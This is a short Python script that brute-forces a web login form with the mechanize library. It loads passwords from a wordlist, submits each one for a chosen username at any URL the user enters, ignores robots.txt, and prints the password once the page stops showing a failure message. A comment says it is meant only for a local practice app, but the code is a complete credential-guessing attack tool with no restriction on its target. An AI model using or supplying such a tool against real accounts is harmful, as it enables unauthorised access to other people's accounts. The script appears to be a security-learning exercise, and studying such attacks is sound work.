#This is a simple brute force login program using mechanize in python
#The mechanize mimics a webservice provider
#The passwords generated from the password_generator.py will create a wordlist
#This program will take the word list a run through all the combination until the webpage redirects
#Note this only works in the controlled environment called the login_app don't use it anywere else

import mechanize

br = mechanize.Browser()#calling the browser object
br.set_handle_robots(False)#avoiding the robot.txt
br.set_handle_redirect(True)
br.set_handle_refresh(True)

def password_list(URL,username):
    #creating a list of the passwords in the wordlist
    password = []
    f = open("wordlist.txt","r")
    for word in f:
        password.append(word.strip())
    f.close()
    brute_force_Login(URL,password,username)

def brute_force_Login(URL,password,username):
    for passwords in password:

        #checking all the passwords in the word list
        br.open(URL)#avoiding the redirection of webpage
        br.select_form(nr=0)
        br["username"] = username
        br["password"] = passwords
        response = br.submit()

        html = response.read().decode("UTF-8")#decoding the contents in the webpage

        #note this is the code wrote after assessing the webpage
        #thus it may differ in other webpages
        if "Login Failed. Try Again." in html:
            print("[-]Login failed")
        else:
            #if password found breaking the for loop
            print("\n[+]Login successful")
            print("[+]Password = " + passwords + "\n")
            break

URL = input("Enter the URL:")
username = input("Enter the username:")
password_list(URL,username)